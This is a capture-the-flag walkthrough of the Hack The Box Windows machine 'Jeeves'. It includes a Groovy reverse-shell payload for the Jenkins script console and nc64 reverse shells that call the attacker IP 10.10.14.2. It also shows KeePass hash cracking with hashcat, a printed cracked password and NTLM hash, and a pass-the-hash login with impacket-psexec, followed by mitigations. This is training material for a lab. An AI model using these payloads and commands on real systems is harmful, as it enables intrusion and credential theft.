---
title: Jeeves
date: 2025-05-01
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Jenkins, kdbx, ADS] 
image: jeeves.png
media_subpath: /assets/img/posts/2025-05-01-jeevesHTB/
---

## Introduction

In this walkthrough, I demonstrate the exploitation of a Windows machine Jeeves hosted on Hack The Box. After discovering open ports 135, 445, 80, and 50000, I found that anonymous access was not permitted on ports 135 and 445. By fuzzing the web service on port 50000, I identified a Jenkins instance hosted under the `/askjeeves` directory. Using Jenkins' script console, I gained a reverse shell. I then located a KeePass `.kdbx` file, converted it to a hashcat-compatible format, and successfully cracked the master password. Transferring the file to my Linux machine, I used `keepassx` to extract stored credentials, which included an admin NTLM hash. Leveraging Impacket’s `psexec` and a pass-the-hash (PTH) attack, I obtained a shell with `NT AUTHORITY\SYSTEM` privileges. Finally, since the flag was hidden, I used Alternate Data Streams (ADS) to uncover and read it. Let's start ..

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check first 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

## Services

### Port 135

```powershell
rpcclient -U'%' $IP
```

**NT_STATUS_ACCESS_DENIED**

### Port 445

```powershell
smbclient -L //$IP/ -N
```

**NT_STATUS_ACCESS_DENIED.**

## Web

### Port 80

- Directory and File Fuzzing
    
    ```powershell
    feroxbuster -u http://$IP/ -C 404,403,400 -w /usr/share/wordlists/dirb/common.txt -x .html, .jsp
    ```
    
    ![image.png](image%203.png)
    

### Port 50000

- **Version** - Jetty 9.4.z-SNAPSHOT
- **Directory and File Fuzzing**
    
    ```powershell
    feroxbuster -u http://:50000$IP/ -C 404,403,400 -w /usr/share/wordlists/dirb/common.txt -x .html, .jsp
    ```
    
    ![image.png](image%204.png)
    
    ```powershell
    gobuster dir -u http://:50000$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42
    ```
    
    ![image.png](image%205.png)
    

## Exploitation

This is Jenkins Automation server  so we are gonna execute a script from script console also we can get more information  about the server from **Manage Jenkins** page

**Manage Jenkins > Script Console** 

```groovy
def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

Let’s change the command to reverse shell command we can find such a reverse shell command from [Reverse Shell CheatSheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#ognl)

```groovy
String host="10.10.14.2";
int port=50000;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Now we have a shell:

![image.png](image%206.png)

## Privilege Escalation

I checked for my privileges and we have SeImpersonatePrivilege

![image.png](image%207.png)

Running `systeminfo` command we see:

![image.png](image%208.png)


> JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
{: .prompt-warning }


Let’s try to perform GodPotato attack. For that we need to determine the .NET version in use:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s 
```

![image.png](image%209.png)

I tried to transfer files using certutil but for some reason it didn’t find it so I used SMB for this purpose:

```bash
sudo impacket-smbserver share -smb2support /home/kali/HTBLabs/Jeeves #Windows
copy \\10.10.14.2\share\GodPotato-NET4.exe #Windows
copy \\10.10.14.2\share\nc64.exe #Windows
```

![image.png](image%2010.png)

![image.png](image%2011.png)

Now we can execute the actual shell command:

```bash
c:\Users\kohsuke\tools\GodPotato-NET4.exe -cmd "c:\Users\kohsuke\tools\nc64.exe -e cmd.exe 10.10.14.2 135"
```

Unfortunately it didn’t work:

![image.png](image%2012.png)

I tried [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) attack but it didn’t work either:

```powershell
.\SigmaPotato.exe "net user khan password /add”
```

![image.png](image%2013.png)

Lastly I am gonna try PrintSpoofer if that also doesn’t work I am gonna search for other vectors:

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```powershell
.\PrintSpoofer.exe -c "c:\Users\kohsuke\tools\nc64.exe 10.10.14.2 135 -e cmd”
```

It didn’t work let’s find other vectors.

Checking our user directories I found an interesting file `.kdbx`:

```powershell
tree /f
```

![image.png](image%2014.png)

Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password.

If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).

For transferring from Windows to Linux I used the same SMB share method.

```bash
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx  
keepass2john Database.kdbx > keepass.hash
```

```bash
hashcat --help | grep -i "KeePass"
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![image.png](image%2015.png)

> Be sure to delete `CEH:` from hash.
{: .prompt-warning }
```bash
hashcat -m 13400 CEH.hash /usr/share/wordlists/rockyou.txt
```

![image.png](image%2016.png)

I am gonna try this password with kohsuke and administrator users:

```bash
sudo nxc smb $IP -u kohsuke -p moonshine1 --shares
```

![image.png](image%2017.png)

```bash
sudo nxc smb $IP -u Administrator -p moonshine1 --shares
```

![image.png](image%2018.png)

What we have obtained is master password for KeePass Password manager I am gonna open it with `keepassx` in Linux.

```bash
sudo apt install keepassx
```

![image.png](image%2019.png)

I checked listening ports but I don’t see neither 8080 nor 8081:

```powershell
netstat -ano
```

![image.png](image%2020.png)

```bash
impacket-psexec Administrator@$IP -hashes :e0fb1fb85756c24235ff238cbe81fe00
```

![image.png](image%2021.png)

I tried LM hash of the Backup Stuff in Pass the Hash attack with impacket and was able to login:

![image.png](image%2022.png)

## Credentials

```bash
From Keepass - moonshine1
Administrator  - e0fb1fb85756c24235ff238cbe81fe00
```

![image.png](image%2023.png)

Let’s get a normal shell by uploading a reverse.exe and executing it first.

There is antivirus working on the target machine here so I cannot transfer the file:

> \\\10.10.14.2\share\reverse.exe
Operation did not complete successfully because the file contains a virus or potentially unwanted software.
{: .prompt-warning }

```powershell
dir /s root.txt
```

I run this commands from `c:\` but nothing can be found.

![image.png](image%2024.png)

```powershell
dir /s *.txt
```

Ran this from `c:\users\administrator`

If it is not here, that means should think out of the box, as text mentions `look deeper` that means maybe root.txt is hidden in that txt file bur rather in alternative data steam:

## Alternate Data Streams

- Regular data stream is a text inside of a file, alternate data streams are used to hide data inside of a file

```powershell
dir /R 
```

![image.png](image%2025.png)

```powershell
more < <FILENAME>
```

![image.png](image%2026.png)

## Mitigation

- **Restrict Access to Jenkins**: Limit Jenkins access to authorized IPs only and avoid exposing it on high-numbered or uncommon ports without authentication.
- **Harden Jenkins Security**: Disable the script console for unauthenticated or non-admin users, and apply access controls rigorously.
- **Secure Sensitive Files**: Protect `.kdbx` and other sensitive files using proper file permissions and consider encrypting them at the filesystem level.
- **Enforce Strong Passwords**: Use complex, non-dictionary passwords to resist cracking with tools like hashcat.
- **NTLM Hash Protection**: Prevent pass-the-hash attacks by enforcing remote credential guard, disabling NTLM where possible, and enabling Credential Guard.
- **Patch Management**: Regularly update Jenkins and the Windows system to address known vulnerabilities.
